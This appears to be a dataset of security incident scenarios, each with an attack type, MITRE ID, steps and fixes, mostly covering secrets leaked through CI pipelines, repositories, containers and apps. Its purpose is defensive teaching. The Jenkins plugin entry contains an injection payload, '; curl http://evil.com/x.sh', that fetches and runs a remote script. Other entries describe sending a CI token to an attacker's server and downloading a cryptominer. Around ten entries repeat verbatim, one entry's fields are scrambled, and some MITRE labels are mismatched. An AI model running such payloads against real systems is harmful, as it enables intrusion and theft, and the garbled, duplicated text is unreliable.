- **Attack Steps**: 1. Long-lived tokens used in CI pipelines (e.g., GitHub deploy tokens) are stored in Secrets Manager.2. A Lambda function runs every 24 hours to scan the expiry date of all stored secrets.3. If a secret is due to expire in the next 7 days, it sends a notification to Slack and creates a Jira issue.4. A weekly report is also emailed to the DevSecOps team with all upcoming expiries.5. Tokens that are older than 90 days trigger additional review and possible auto-rotation.6. Lambda logs are stored in CloudWatch and analyzed monthly.7. Rotated tokens are marked with metadata including rotation date and tool.8. Alerts also check for tokens without expiry metadata and tag them for manual review.9. Secrets are version-controlled in Secrets Manager, enabling rollback if needed.10. This system enforces lifecycle hygiene for all CI-integrated tokens.
- **Detection**: Slack + CloudWatch logs
- **Solution**: Track + alert on upcoming token expiries
- **Tags**: #tokenlifecycle #autonotify #secretexpiry

## Pre-Commit Policy Scans for Private Key Patterns in YAML Files

- **Attack Type**: Secret Pattern DLP
- **Target**: YAML Config Files
- **Vulnerability**: Sensitive keys in config templates
- **MITRE**: T1552.001
- **Impact**: Stops misconfigured YAML from leaking secrets
- **Tools**: YAML Policy Engine, Pre-commit
- **Scenario**: Enforce denylist of private key formats using YAML-based policy rules
- **Attack Steps**: 1. Developers often embed service certificates in YAML files unintentionally.2. A pre-commit hook is configured to apply a policy engine that parses YAML files.3. The policy includes rules such as *.key, PEM format, and base64-encoded blocks > 1024 chars.4. On detection, the hook blocks the commit and points to specific offending lines.5. A remediation guide is provided via the terminal on how to use secure mount instead.6. Policies are reviewed and refined weekly based on false positive rates.7. Developers contribute new patterns into the denylist via internal RFC process.8. Secrets found are reported to a GitHub dashboard per project.9. Offending files are auto-added to .gitignore post-fix.10. Helps enforce secret-free YAML files across IaC, Helm charts, K8s manifests.
- **Detection**: Policy logs + GitHub dashboard
- **Solution**: Pattern-match secrets in YAML via hook
- **Tags**: #yamlsecurity #pemdetect #denypolicy

## Slack Webhook Token Leaked in GitHub README File

- **Attack Type**: Token Leak via GitHub
- **Target**: Slack Workspace
- **Vulnerability**: Slack webhook publicly exposed
- **MITRE**: T1552.001
- **Impact**: Internal comms disrupted, brand risk
- **Tools**: GitHub, Slack, curl
- **Scenario**: A developer accidentally committed a Slack Incoming Webhook URL to a public repo
- **Attack Steps**: 1. A developer working on a Slack-integrated project embeds the webhook URL in the README.md for easy testing.2. The repository is made public, and within minutes, automated bots scan the file.3. An attacker finds the webhook URL and starts sending spam messages into the Slack channel via curl -X POST.4. The attacker escalates the abuse by sending offensive or phishing messages that appear to come from a trusted app.5. The incident causes confusion and operational disruption for the internal team.6. The webhook is only revoked after someone spots the spam inside Slack.7. Slack logs show multiple abuse events originating from various IPs.8. No alerting system was in place to notify when a webhook was used unusually.9. Post-incident, the org enables rotation policies and external webhook alerts.10. The README.md is rewritten and .env is used to separate runtime secrets from code.
- **Detection**: Slack usage logs
- **Solution**: Avoid committing webhook URLs, use secrets mgmt
- **Tags**: #slack #webhook #bugbounty

## AWS Access Key Found in GitLab Public Project

- **Attack Type**: AWS Credential Exposure
- **Target**: AWS Account
- **Vulnerability**: Access key in public code repo
- **MITRE**: T1552.004
- **Impact**: Unauthorized infra usage, financial loss
- **Tools**: GitLab, AWS CLI, TruffleHog
- **Scenario**: AWS IAM credentials were left in a GitLab repo and picked up by bots
- **Attack Steps**: 1. A developer uses aws configure and accidentally commits .aws/credentials to a GitLab repo.2. The repo is public for a few hours before being privatized.3. During that window, automated scanners like TruffleHog or open-source scrapers detect and extract the keys.4. The keys allow full access to S3, EC2, and CloudWatch due to attached policies.5. Attackers spin up EC2 instances for cryptomining using the compromised credentials.6. The AWS bill spikes within hours, alerting the billing team—not the security team.7. Investigation traces IAM activity using CloudTrail logs, revealing misuse.8. Keys are immediately revoked and IAM policy scopes are narrowed.9. AWS Trusted Advisor flags the incident too late to prevent cost loss.10. Going forward, Git hooks + GitLab secret scanning are implemented before every push.
- **Detection**: CloudTrail + AWS billing alerts
- **Solution**: Rotate keys fast, enforce git scanning
- **Tags**: #aws #gitlab #secretleak

## GitHub Actions Used to Mine Crypto on Public Repo

- **Attack Type**: CI Abuse (Resource Theft)
- **Target**: GitHub Actions
- **Vulnerability**: Unrestricted CI trigger from PR
- **MITRE**: T1496
- **Impact**: Free compute abused for crypto
- **Tools**: GitHub, Docker, Crypto Mining Script
- **Scenario**: A public GitHub repo allowed arbitrary PRs which triggered CI, used for mining
- **Attack Steps**: 1. A popular open-source project accepts PRs from unknown contributors.2. GitHub Actions is set to run on any PR without restriction.3. An attacker forks the repo and opens a PR that looks innocent but modifies the CI YAML.4. The YAML downloads a cryptominer payload from a pastebin URL and runs it using Docker inside the CI runner.5. The CI job runs for hours, using GitHub-hosted runner compute for free.6. The attacker repeats this across hundreds of repositories.7. GitHub detects the abuse and temporarily disables CI for the project.8. Maintainers are notified and the PR is removed.9. The incident prompts enforcement of trusted-contributor-only workflows.10. Lessons learned include isolating CI triggers and enabling audit workflows for unreviewed YAML files.
- **Detection**: GitHub Action job logs
- **Solution**: Restrict workflow triggers to trusted users
- **Tags**: #cryptomining #ciabuse #github

## Jenkins Console Exposed to Internet with Admin Access

- **Attack Type**: CI Console Misconfiguration
- **Target**: Jenkins Server
- **Vulnerability**: CI admin panel open on internet
- **MITRE**: T1086
- **Impact**: Full remote code execution
- **Tools**: Jenkins, cURL, Groovy Console
- **Scenario**: A public Jenkins instance allowed console access to anyone with no auth
- **Attack Steps**: 1. A researcher finds a Jenkins dashboard exposed to the public internet.2. No authentication or login wall is present; clicking "Script Console" opens a Groovy shell.3. The researcher runs system commands via Groovy like println "whoami" and ls /.4. They enumerate environment variables, credentials, and SCM tokens stored inside Jenkins.5. Attackers could potentially dump pipeline secrets, private SSH keys, or AWS keys.6. Proof-of-concept shows total control of the CI system and access to deployment environments.7. Jenkins audit logs are either disabled or cleared.8. After notification, the company shuts down the instance and rotates all secrets.9. Going forward, they enable IP whitelisting, SSO, and audit logging.10. Jenkins deployments are scanned quarterly for public access exposure.
- **Detection**: Groovy script logs + external scanner
- **Solution**: Never expose CI consoles without auth
- **Tags**: #jenkins #groovyshell #misconfig

## Docker Hub Image with Hardcoded Firebase Key

- **Attack Type**: Container Image Secret Exposure
- **Target**: Public Docker Registry
- **Vulnerability**: API key baked into container image
- **MITRE**: T1552.001
- **Impact**: Database access breach via image pull
- **Tools**: Docker Hub, Firebase, Dive
- **Scenario**: Docker image contained private Firebase config used in production
- **Attack Steps**: 1. A public Docker image is published to Docker Hub with prebuilt files.2. An attacker pulls the image and inspects the filesystem using dive.3. Inside a /config/firebase.js file, a Firebase API key and service account email are hardcoded.4. The attacker uses the key to access the Firebase DB and read/write to it.5. No IP restriction is applied on Firebase, so anyone with the key can access it.6. The org receives a report days later and revokes the project key.7. A post-mortem finds that secrets were baked into the image during the build.8. CI/CD pipeline is updated to inject secrets at runtime via mounted volumes.9. Docker images are now scanned automatically using Trivy and Grype.10. Firebase is configured to enforce strict auth and API quotas.
- **Detection**: Docker image scan tools + logs
- **Solution**: Inject secrets during runtime only
- **Tags**: #docker #firebase #imageleak

## Discord Webhook Spammed via Public GitHub Push

- **Attack Type**: Messaging Integration Leak
- **Target**: Discord App
- **Vulnerability**: Discord webhook in frontend code
- **MITRE**: T1552.001
- **Impact**: Chat system spammed externally
- **Tools**: GitHub, Discord, Webhook
- **Scenario**: Discord webhook exposed in JavaScript project in config.js
- **Attack Steps**: 1. A JavaScript developer commits config.js with DISCORD_WEBHOOK_URL variable.2. GitHub repository is public and indexed by search engines.3. Within 30 minutes, bots find and start sending messages to the Discord channel.4. Spam includes phishing links, offensive messages, and fake error alerts.5. Discord disables the webhook due to abuse.6. Developer is unaware until their Discord channel is flooded.7. Post-incident, a GitHub Secret Scanning alert is added, and webhooks are stored in .env.8. Developer rotates the webhook and enables user-based auth for future messages.9. CI/CD pipeline is modified to load env secrets via GitHub Secrets.10. Security policy is updated to block push of config.js via .gitignore.
- **Detection**: Discord abuse logs + GitHub alerts
- **Solution**: Store webhooks outside of repo
- **Tags**: #discord #webhookleak #frontendsecrets

## Public Terraform Repo Contained GitHub PAT with Repo Scope

- **Attack Type**: PAT Leak in IaC Repo
- **Target**: GitHub + Terraform
- **Vulnerability**: Exposed automation tokens
- **MITRE**: T1552.001
- **Impact**: Repo control via compromised token
- **Tools**: GitHub, Terraform
- **Scenario**: A GitHub Personal Access Token with repo read/write was exposed in Terraform variable
- **Attack Steps**: 1. A Terraform .tfvars file in a public repo contains a line: github_token = "ghp_abcd1234...".2. An attacker clones the repo and tests the token via GitHub API.3. Token grants full access to multiple internal repos.4. The attacker is able to clone private code, open PRs, and even create issues.5. GitHub Secret Scanning sends a delayed alert to the owner.6. Security team revokes the token and investigates usage.7. The attack window lasted over 6 hours.8. The organization replaces all hardcoded tokens with Vault-backed variables.9. Git hooks are updated to detect PATs in all .tfvars, .env, and .yaml.10. GitHub App replaces PATs for automation purposes.
- **Detection**: GitHub API logs + token diff scan
- **Solution**: Use apps, not PATs, for automation
- **Tags**: #githubtoken #terraform #patleak

## Jenkins Pipeline Dumped AWS Secrets in Console Log

- **Attack Type**: CI Log Leak
- **Target**: Jenkins Logs
- **Vulnerability**: Unmasked secrets in console logs
- **MITRE**: T1552.004
- **Impact**: Exposure of credentials via logs
- **Tools**: Jenkins, AWS CLI, Shell Script
- **Scenario**: A Jenkins job echoed AWS credentials during script error
- **Attack Steps**: 1. A Jenkinsfile contains an echo statement printing AWS_SECRET_ACCESS_KEY accidentally.2. During a failed build, this line gets executed and prints to the console.3. Jenkins is integrated with Slack, so console logs are shared during alerts.4. An attacker with access to Slack sees the logs and extracts the key.5. Key is used to spin up EC2 compute for 3 hours before being revoked.6. Jenkins job is updated to mask credentials and use withCredentials block.7. Secret is rotated in AWS Secrets Manager.8. Slack alerting is throttled and filtered to remove sensitive logs.9. Audit confirms logs were not scraped publicly, but risk was high.10. Jenkins is hardened to redact secrets in output logs going forward.
- **Detection**: Jenkins logs + Slack
- **Solution**: Redact secrets from CI logs
- **Tags**: #jenkins #awskey #logleak

## GitHub Actions Token Reused in Malicious Fork via PR

- **Attack Type**: Token Reuse via CI Fork
- **Target**: GitHub Actions
- **Vulnerability**: Token exposure via PR fork
- **MITRE**: T1552.004
- **Impact**: Repo integrity threatened via CI token
- **Tools**: GitHub, GitHub Actions
- **Scenario**: Malicious fork triggers Action that reuses repo token in PR context
- **Attack Steps**: 1. A malicious user forks a repo and opens a PR.2. GitHub Actions uses GITHUB_TOKEN with write access even on forks.3. The attacker modifies the workflow to curl the token to their server.4. This token allows limited repo actions and could open issues, write to PRs, etc.5. The token is short-lived but still used to cause spam.6. GitHub flags the repo and disables CI temporarily.7. The fix is to use pull_request_target only with read-only tokens.8. Workflows are hardened to validate contributors before secrets are exposed.9. Audit logs confirm only PR actions were exploited.10. Security policy updated to avoid secret exposure in untrusted PRs.
- **Detection**: GitHub Action audit logs
- **Solution**: Disable secret access for forks
- **Tags**: #githubactions #prsecurity #tokenreuse

## Firebase Admin SDK Credentials Found in React App Bundle

- **Attack Type**: Frontend Secret Exposure
- **Target**: Firebase + Web App
- **Vulnerability**: SDK key in frontend JS bundle
- **MITRE**: T1552.001
- **Impact**: Full DB access via client-exposed secrets
- **Tools**: Firebase, ReactJS, Webpack
- **Scenario**: Firebase credentials were included in React app served to all users
- **Attack Steps**: 1. A React app includes the full Firebase config including admin SDK credentials.2. On build, these variables are bundled into the JS served to users.3. Any attacker who opens browser DevTools and inspects the source can extract the credentials.4. Firebase admin SDK allows full DB control.5. The attacker writes to the database and adds new users with admin role.6. Firebase logs show suspicious write activity.7. The devs revoke the project’s SDK key.8. Secrets are moved to a backend proxy that signs requests securely.9. CI/CD builds now verify that no sensitive config is bundled.10. Devs are trained on separating frontend vs backend secrets.
- **Detection**: Firebase logs + DevTools inspection
- **Solution**: Never bundle backend secrets in client
- **Tags**: #firebase #frontend #sdkleak

## Slack Webhook Token Leaked in GitHub README File

- **Attack Type**: Token Leak via GitHub
- **Target**: Slack Workspace
- **Vulnerability**: Slack webhook publicly exposed
- **MITRE**: T1552.001
- **Impact**: Internal comms disrupted, brand risk
- **Tools**: GitHub, Slack, curl
- **Scenario**: A developer accidentally committed a Slack Incoming Webhook URL to a public repo
- **Attack Steps**: 1. A developer working on a Slack-integrated project embeds the webhook URL in the README.md for easy testing.2. The repository is made public, and within minutes, automated bots scan the file.3. An attacker finds the webhook URL and starts sending spam messages into the Slack channel via curl -X POST.4. The attacker escalates the abuse by sending offensive or phishing messages that appear to come from a trusted app.5. The incident causes confusion and operational disruption for the internal team.6. The webhook is only revoked after someone spots the spam inside Slack.7. Slack logs show multiple abuse events originating from various IPs.8. No alerting system was in place to notify when a webhook was used unusually.9. Post-incident, the org enables rotation policies and external webhook alerts.10. The README.md is rewritten and .env is used to separate runtime secrets from code.
- **Detection**: Slack usage logs
- **Solution**: Avoid committing webhook URLs, use secrets mgmt
- **Tags**: #slack #webhook #bugbounty

## AWS Access Key Found in GitLab Public Project

- **Attack Type**: AWS Credential Exposure
- **Target**: AWS Account
- **Vulnerability**: Access key in public code repo
- **MITRE**: T1552.004
- **Impact**: Unauthorized infra usage, financial loss
- **Tools**: GitLab, AWS CLI, TruffleHog
- **Scenario**: AWS IAM credentials were left in a GitLab repo and picked up by bots
- **Attack Steps**: 1. A developer uses aws configure and accidentally commits .aws/credentials to a GitLab repo.2. The repo is public for a few hours before being privatized.3. During that window, automated scanners like TruffleHog or open-source scrapers detect and extract the keys.4. The keys allow full access to S3, EC2, and CloudWatch due to attached policies.5. Attackers spin up EC2 instances for cryptomining using the compromised credentials.6. The AWS bill spikes within hours, alerting the billing team—not the security team.7. Investigation traces IAM activity using CloudTrail logs, revealing misuse.8. Keys are immediately revoked and IAM policy scopes are narrowed.9. AWS Trusted Advisor flags the incident too late to prevent cost loss.10. Going forward, Git hooks + GitLab secret scanning are implemented before every push.
- **Detection**: CloudTrail + AWS billing alerts
- **Solution**: Rotate keys fast, enforce git scanning
- **Tags**: #aws #gitlab #secretleak

## GitHub Actions Used to Mine Crypto on Public Repo

- **Attack Type**: CI Abuse (Resource Theft)
- **Target**: GitHub Actions
- **Vulnerability**: Unrestricted CI trigger from PR
- **MITRE**: T1496
- **Impact**: Free compute abused for crypto
- **Tools**: GitHub, Docker, Crypto Mining Script
- **Scenario**: A public GitHub repo allowed arbitrary PRs which triggered CI, used for mining
- **Attack Steps**: 1. A popular open-source project accepts PRs from unknown contributors.2. GitHub Actions is set to run on any PR without restriction.3. An attacker forks the repo and opens a PR that looks innocent but modifies the CI YAML.4. The YAML downloads a cryptominer payload from a pastebin URL and runs it using Docker inside the CI runner.5. The CI job runs for hours, using GitHub-hosted runner compute for free.6. The attacker repeats this across hundreds of repositories.7. GitHub detects the abuse and temporarily disables CI for the project.8. Maintainers are notified and the PR is removed.9. The incident prompts enforcement of trusted-contributor-only workflows.10. Lessons learned include isolating CI triggers and enabling audit workflows for unreviewed YAML files.
- **Detection**: GitHub Action job logs
- **Solution**: Restrict workflow triggers to trusted users
- **Tags**: #cryptomining #ciabuse #github

## Jenkins Console Exposed to Internet with Admin Access

- **Attack Type**: CI Console Misconfiguration
- **Target**: Jenkins Server
- **Vulnerability**: CI admin panel open on internet
- **MITRE**: T1086
- **Impact**: Full remote code execution
- **Tools**: Jenkins, cURL, Groovy Console
- **Scenario**: A public Jenkins instance allowed console access to anyone with no auth
- **Attack Steps**: 1. A researcher finds a Jenkins dashboard exposed to the public internet.2. No authentication or login wall is present; clicking "Script Console" opens a Groovy shell.3. The researcher runs system commands via Groovy like println "whoami" and ls /.4. They enumerate environment variables, credentials, and SCM tokens stored inside Jenkins.5. Attackers could potentially dump pipeline secrets, private SSH keys, or AWS keys.6. Proof-of-concept shows total control of the CI system and access to deployment environments.7. Jenkins audit logs are either disabled or cleared.8. After notification, the company shuts down the instance and rotates all secrets.9. Going forward, they enable IP whitelisting, SSO, and audit logging.10. Jenkins deployments are scanned quarterly for public access exposure.
- **Detection**: Groovy script logs + external scanner
- **Solution**: Never expose CI consoles without auth
- **Tags**: #jenkins #groovyshell #misconfig

## Docker Hub Image with Hardcoded Firebase Key

- **Attack Type**: Container Image Secret Exposure
- **Target**: Public Docker Registry
- **Vulnerability**: API key baked into container image
- **MITRE**: T1552.001
- **Impact**: Database access breach via image pull
- **Tools**: Docker Hub, Firebase, Dive
- **Scenario**: Docker image contained private Firebase config used in production
- **Attack Steps**: 1. A public Docker image is published to Docker Hub with prebuilt files.2. An attacker pulls the image and inspects the filesystem using dive.3. Inside a /config/firebase.js file, a Firebase API key and service account email are hardcoded.4. The attacker uses the key to access the Firebase DB and read/write to it.5. No IP restriction is applied on Firebase, so anyone with the key can access it.6. The org receives a report days later and revokes the project key.7. A post-mortem finds that secrets were baked into the image during the build.8. CI/CD pipeline is updated to inject secrets at runtime via mounted volumes.9. Docker images are now scanned automatically using Trivy and Grype.10. Firebase is configured to enforce strict auth and API quotas.
- **Detection**: Docker image scan tools + logs
- **Solution**: Inject secrets during runtime only
- **Tags**: #docker #firebase #imageleak

## Discord Webhook Spammed via Public GitHub Push

- **Attack Type**: Messaging Integration Leak
- **Target**: Discord App
- **Vulnerability**: Discord webhook in frontend code
- **MITRE**: T1552.001
- **Impact**: Chat system spammed externally
- **Tools**: GitHub, Discord, Webhook
- **Scenario**: Discord webhook exposed in JavaScript project in config.js
- **Attack Steps**: 1. A JavaScript developer commits config.js with DISCORD_WEBHOOK_URL variable.2. GitHub repository is public and indexed by search engines.3. Within 30 minutes, bots find and start sending messages to the Discord channel.4. Spam includes phishing links, offensive messages, and fake error alerts.5. Discord disables the webhook due to abuse.6. Developer is unaware until their Discord channel is flooded.7. Post-incident, a GitHub Secret Scanning alert is added, and webhooks are stored in .env.8. Developer rotates the webhook and enables user-based auth for future messages.9. CI/CD pipeline is modified to load env secrets via GitHub Secrets.10. Security policy is updated to block push of config.js via .gitignore.
- **Detection**: Discord abuse logs + GitHub alerts
- **Solution**: Store webhooks outside of repo
- **Tags**: #discord #webhookleak #frontendsecrets

## Public Terraform Repo Contained GitHub PAT with Repo Scope

- **Attack Type**: PAT Leak in IaC Repo
- **Target**: GitHub + Terraform
- **Vulnerability**: Exposed automation tokens
- **MITRE**: T1552.001
- **Impact**: Repo control via compromised token
- **Tools**: GitHub, Terraform
- **Scenario**: A GitHub Personal Access Token with repo read/write was exposed in Terraform variable
- **Attack Steps**: 1. A Terraform .tfvars file in a public repo contains a line: github_token = "ghp_abcd1234...".2. An attacker clones the repo and tests the token via GitHub API.3. Token grants full access to multiple internal repos.4. The attacker is able to clone private code, open PRs, and even create issues.5. GitHub Secret Scanning sends a delayed alert to the owner.6. Security team revokes the token and investigates usage.7. The attack window lasted over 6 hours.8. The organization replaces all hardcoded tokens with Vault-backed variables.9. Git hooks are updated to detect PATs in all .tfvars, .env, and .yaml.10. GitHub App replaces PATs for automation purposes.
- **Detection**: GitHub API logs + token diff scan
- **Solution**: Use apps, not PATs, for automation
- **Tags**: #githubtoken #terraform #patleak

## Jenkins Pipeline Dumped AWS Secrets in Console Log

- **Attack Type**: CI Log Leak
- **Target**: Jenkins Logs
- **Vulnerability**: Unmasked secrets in console logs
- **MITRE**: T1552.004
- **Impact**: Exposure of credentials via logs
- **Tools**: Jenkins, AWS CLI, Shell Script
- **Scenario**: A Jenkins job echoed AWS credentials during script error
- **Attack Steps**: 1. A Jenkinsfile contains an echo statement printing AWS_SECRET_ACCESS_KEY accidentally.2. During a failed build, this line gets executed and prints to the console.3. Jenkins is integrated with Slack, so console logs are shared during alerts.4. An attacker with access to Slack sees the logs and extracts the key.5. Key is used to spin up EC2 compute for 3 hours before being revoked.6. Jenkins job is updated to mask credentials and use withCredentials block.7. Secret is rotated in AWS Secrets Manager.8. Slack alerting is throttled and filtered to remove sensitive logs.9. Audit confirms logs were not scraped publicly, but risk was high.10. Jenkins is hardened to redact secrets in output logs going forward.
- **Detection**: Jenkins logs + Slack
- **Solution**: Redact secrets from CI logs
- **Tags**: #jenkins #awskey #logleak

## GitHub Actions Token Reused in Malicious Fork via PR

- **Attack Type**: Token Reuse via CI Fork
- **Target**: GitHub Actions
- **Vulnerability**: Token exposure via PR fork
- **MITRE**: T1552.004
- **Impact**: Repo integrity threatened via CI token
- **Tools**: GitHub, GitHub Actions
- **Scenario**: Malicious fork triggers Action that reuses repo token in PR context
- **Attack Steps**: 1. A malicious user forks a repo and opens a PR.2. GitHub Actions uses GITHUB_TOKEN with write access even on forks.3. The attacker modifies the workflow to curl the token to their server.4. This token allows limited repo actions and could open issues, write to PRs, etc.5. The token is short-lived but still used to cause spam.6. GitHub flags the repo and disables CI temporarily.7. The fix is to use pull_request_target only with read-only tokens.8. Workflows are hardened to validate contributors before secrets are exposed.9. Audit logs confirm only PR actions were exploited.10. Security policy updated to avoid secret exposure in untrusted PRs.
- **Detection**: GitHub Action audit logs
- **Solution**: Disable secret access for forks
- **Tags**: #githubactions #prsecurity #tokenreuse

## Firebase Admin SDK Credentials Found in React App Bundle

- **Attack Type**: Frontend Secret Exposure
- **Target**: Firebase + Web App
- **Vulnerability**: SDK key in frontend JS bundle
- **MITRE**: T1552.001
- **Impact**: Full DB access via client-exposed secrets
- **Tools**: Firebase, ReactJS, Webpack
- **Scenario**: Firebase credentials were included in React app served to all users
- **Attack Steps**: 1. A React app includes the full Firebase config including admin SDK credentials.2. On build, these variables are bundled into the JS served to users.3. Any attacker who opens browser DevTools and inspects the source can extract the credentials.4. Firebase admin SDK allows full DB control.5. The attacker writes to the database and adds new users with admin role.6. Firebase logs show suspicious write activity.7. The devs revoke the project’s SDK key.8. Secrets are moved to a backend proxy that signs requests securely.9. CI/CD builds now verify that no sensitive config is bundled.10. Devs are trained on separating frontend vs backend secrets.
- **Detection**: Firebase logs + DevTools inspection
- **Solution**: Never bundle backend secrets in client
- **Tags**: #firebase #frontend #sdkleak

## Hardcoded Azure Keys Found in Android App APK

- **Attack Type**: Mobile App Secret Exposure
- **Target**: Android Mobile App
- **Vulnerability**: Azure storage key exposed in APK
- **MITRE**: T1552.001
- **Impact**: Full access to cloud file storage
- **Tools**: Android APKTool, jadx, Azure Storage Explorer
- **Scenario**: Azure storage keys and client secrets hardcoded in Android APK reverse-engineered by researcher
- **Attack Steps**: 1. A security researcher downloads a public Android app from Google Play that interacts with Azure blob storage.2. Using jadx and APKTool, they decompile the APK to view the source code and resources.3. In strings.xml and hardcoded Java classes, they find the full Azure connection string, which includes DefaultEndpointsProtocol, AccountName, and AccountKey.4. The researcher uses Azure Storage Explorer to connect to the blob storage.5. They are able to upload, delete, and download files from a production container with no restrictions.6. Sensitive user data, images, and logs are accessible, violating data privacy laws.7. The researcher reports the bug; the team revokes the key immediately.8. Postmortem reveals secrets were hardcoded during app testing and accidentally committed.9. DevOps pipeline is modified to inject secrets at runtime using Keystore.10. Secrets scanning and mobile app reviews are added to the release process.
- **Detection**: Azure Storage logs, VirusTotal APK scan
- **Solution**: Remove secrets from mobile apps entirely
- **Tags**: #apk #azurekey #reverseengineer

## GitHub Repo Used to Deliver Obfuscated JavaScript Malware

- **Attack Type**: Malicious File Hosting
- **Target**: Web Browser
- **Vulnerability**: GitHub as malware host
- **MITRE**: T1566.002
- **Impact**: Malware delivered via trusted CDN
- **Tools**: GitHub, JSObfuscator, curl
- **Scenario**: An attacker abuses GitHub repo as trusted file host for delivering JS malware
- **Attack Steps**: 1. An attacker creates a public GitHub repo with a file named utils.js, appearing as a legitimate library.2. Inside utils.js, heavily obfuscated JavaScript code is included that loads a second-stage payload.3. This JS file is then linked to in phishing HTML pages or malicious ad banners (malvertising).4. Because GitHub is a trusted domain, it bypasses many basic URL filters.5. When the victim's browser loads the phishing page, it fetches utils.js directly from raw.githubusercontent.com.6. The code runs in the browser and sends device fingerprinting + beaconing requests.7. GitHub takes down the file only after abuse reports are submitted.8. The attacker continues rotating repositories to avoid takedowns.9. Incident leads to implementation of stricter GitHub abuse detection on raw content.10. Red teams learn to inspect all third-party JS references for obfuscated content.
- **Detection**: Browser network logs, JS inspection
- **Solution**: Detect and block raw GitHub in filters
- **Tags**: #malvertising #jsobfuscation #githubcdn

## Jenkinsfile in Public Repo Contained Database Password

- **Attack Type**: CI Pipeline Leak
- **Target**: GitHub Jenkinsfile
- **Vulnerability**: Hardcoded secrets in CI pipeline
- **MITRE**: T1552.004
- **Impact**: Database compromise via CI script
- **Tools**: GitHub, Jenkins, SQLmap
- **Scenario**: A publicly viewable Jenkinsfile had hardcoded MySQL credentials for staging DB
- **Attack Steps**: 1. A public repo contains a Jenkinsfile that includes steps to connect to a MySQL staging database.2. The connection string, jdbc:mysql://dbhost:3306/app?user=admin&password=plaintext123, is visible in plain text.3. A researcher clones the repo and tests the credentials using mysql CLI and SQLmap.4. The connection is successful; no IP restrictions are in place.5. They perform enumeration and confirm database read/write access.6. Multiple PII-containing tables are accessible, even though it's a staging system.7. Researcher responsibly discloses the issue.8. The password is rotated, and the Jenkinsfile is updated to pull from a secret manager.9. GitHub history still shows the old secret, so history is purged using git filter-branch.10. DevSecOps policies are changed to prevent secret storage in pipeline configs.
- **Detection**: MySQL logs, GitHub secret scanning
- **Solution**: Pull secrets from Vault, not hardcode
- **Tags**: #jenkins #dbleak #pipelineconfig

## Public S3 Bucket Hosting Internal App Backups

- **Attack Type**: Cloud Storage Misconfiguration
- **Target**: AWS S3
- **Vulnerability**: Bucket policy: public-read
- **MITRE**: T1530
- **Impact**: Full data exposure via open bucket
- **Tools**: AWS S3, AWS CLI, Bucket Finder
- **Scenario**: S3 bucket set to public read allowed downloading of full internal backups
- **Attack Steps**: 1. A researcher finds a subdomain pointing to myorg-internal-backups.s3.amazonaws.com.2. Using aws s3 ls and public bucket scanning tools, they discover the bucket is accessible without credentials.3. The bucket contains multiple .tar.gz and .sql files with full internal application and database backups.4. Files include passwords, PII, logs, and environment configurations.5. They verify the contents and responsibly report to the org.6. The org disables public access and revokes exposed credentials.7. S3 public access block is enabled at the account level.8. All backup workflows are updated to use lifecycle rules and encryption.9. Automated checks are set up using AWS Config rules.10. The org acknowledges the report and implements a continuous cloud scanning solution.
- **Detection**: Bucket scanners, AWS Access Analyzer
- **Solution**: Always block public access to S3
- **Tags**: #s3bucket #backup #cloudleak

## GitHub Pages Site Served Phishing Kit Masquerading as OAuth Login

- **Attack Type**: Phishing Kit Hosting
- **Target**: GitHub Pages
- **Vulnerability**: Trusted domain phishing
- **MITRE**: T1566.002
- **Impact**: Credential theft via fake login
- **Tools**: GitHub Pages, HTML Templates
- **Scenario**: GitHub Pages used to host HTML-based phishing portal mimicking Google OAuth
- **Attack Steps**: 1. An attacker forks a legitimate GitHub repo and modifies the hosted Pages site.2. They replace the content with a phishing kit mimicking Google's OAuth login page.3. The URL seems legitimate and hosted on username.github.io.4. The page captures email and password fields and stores them in a backend script.5. Victims are directed to the fake page through phishing emails and shortened links.6. GitHub Pages doesn’t detect the change since the repo itself seems normal.7. After reports, GitHub disables the repo and Pages link.8. Users fall victim before takedown, losing email accounts.9. GitHub strengthens detection of Pages used for phishing kits.10. Security teams are encouraged to monitor unusual GitHub Pages references in emails.
- **Detection**: Email headers, phishing link scan
- **Solution**: Block unverified GitHub Pages usage
- **Tags**: #oauthphish #githubpages #bugbounty

## Jenkins Plugin Allowed Command Injection via User Input

- **Attack Type**: Plugin Vulnerability
- **Target**: bash` as the ENV value.4. Jenkins executes the payload, fetching and running a remote script.5. Full RCE is achieved through CI runner.6. Plugin lacked input sanitization and command escaping.7. Jenkins logs show the attack post-execution.8. Maintainers fix the plugin and escape user input properly.9. Postmortem includes rewriting Groovy scripts to avoid inline shell usage.10. All plugin parameters are validated in future releases.
- **Vulnerability**: Jenkins Server
- **MITRE**: User input not validated
- **Impact**: T1203
- **Tools**: Jenkins, Burp Suite
- **Scenario**: A misconfigured Jenkins plugin executed shell commands based on unvalidated inputs
- **Attack Steps**: 1. A Jenkins plugin accepted user-provided input as part of a deployment job.2. The input field was concatenated into a shell command inside a Groovy script: sh "deploy --env $ENV".3. A researcher enters `; curl http://evil.com/x.sh
- **Detection**: RCE via Jenkins job injection
- **Solution**: Jenkins job logs
- **Tags**: Always sanitize inputs in CI/CD plugins

## GitHub Repository History Revealed Revoked AWS Keys

- **Attack Type**: Git History Exposure
- **Target**: GitHub
- **Vulnerability**: Secrets remain in commit history
- **MITRE**: T1552.004
- **Impact**: Post-revocation access via history
- **Tools**: GitHub, Git Filter-Repo
- **Scenario**: Although AWS key was revoked, history still contained secret
- **Attack Steps**: 1. A GitHub repo had a leaked AWS key that was revoked.2. A researcher cloned the repo and ran git log -p to view commit diffs.3. The key was found in a previous commit, although removed from the latest version.4. The revoked key was reused in an attack simulation using another service that cached permissions.5. The attacker accesses S3 for a few minutes until full revocation propagates.6. GitHub does not remove secrets from history by default.7. Dev team learns to purge entire git history using filter-repo or BFG Repo-Cleaner.8. AWS advises to scope IAM tokens narrowly.9. Organization sets up GitHub commit scanning using gitleaks.10. Dev training includes how to scrub secrets across entire git logs.
- **Detection**: Git history scans
- **Solution**: Purge secrets from git history fully
- **Tags**: #gitleaks #revokedkey #githubhistory

## GCP Service Account Key Leaked in Notebook Shared Publicly

- **Attack Type**: Cloud Key Exposure
- **Target**: GCP + Colab
- **Vulnerability**: Key in shared notebook
- **MITRE**: T1552.001
- **Impact**: GCP infra compromise via leaked key
- **Tools**: Google Colab, GCP IAM
- **Scenario**: Jupyter notebook with GCP key shared via public link
